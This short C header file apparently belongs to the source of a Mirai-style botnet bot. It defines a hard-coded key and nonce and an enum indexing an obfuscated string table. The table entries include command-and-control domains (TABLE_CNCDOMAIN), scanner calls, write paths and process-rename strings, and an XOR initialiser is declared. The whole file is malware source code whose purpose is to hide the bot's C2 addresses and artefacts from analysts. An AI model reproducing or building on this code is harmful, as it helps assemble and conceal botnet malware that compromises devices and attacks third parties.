#pragma once

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "defines.h"
#include "util.h"

static uint8_t key[] = {
    0x16, 0x1e, 0x19, 0x1b,
    0x11, 0x1f, 0x00, 0x1d,
    0x04, 0x1c, 0x0e, 0x08,
    0x0b, 0x1a, 0x12, 0x07,
    0x05, 0x09, 0x0d, 0x0f,
    0x06, 0x0a, 0x15, 0x01,
    0x0c, 0x14, 0x1f, 0x17,
    0x02, 0x03, 0x13, 0x18
};

static uint8_t nonce[] = {
    0x1e, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


typedef struct
{
    char *string;
    int len, locked;
} Encryption;

typedef enum
{
    TABLE_EXEC_SUCCESS,
    TABLE_WRITEPATH,
    TABLE_WRITEPATH1,
    TABLE_WRITEPATH2,
    TABLE_WRITEPATH3,
    TABLE_WRITEPATH4,
    TABLE_WRITEPATH5,
    TABLE_CNCDOMAIN,
    TABLE_CNCDOMAIN1,
    TABLE_CNCDOMAIN2,
    TABLE_CNCDOMAIN3,
    TABLE_SCANCALL,
    TABLE_RENAME1,
    TABLE_RENAME2,
    TABLE_RENAME3,
    TABLE_RENAME4,
    TABLE_RENAME5,
    TABLE_RENAME6,
    ENC_TABLE_MAX,
} EncryptionTable;


extern Encryption *enc;

void xor_init(void);
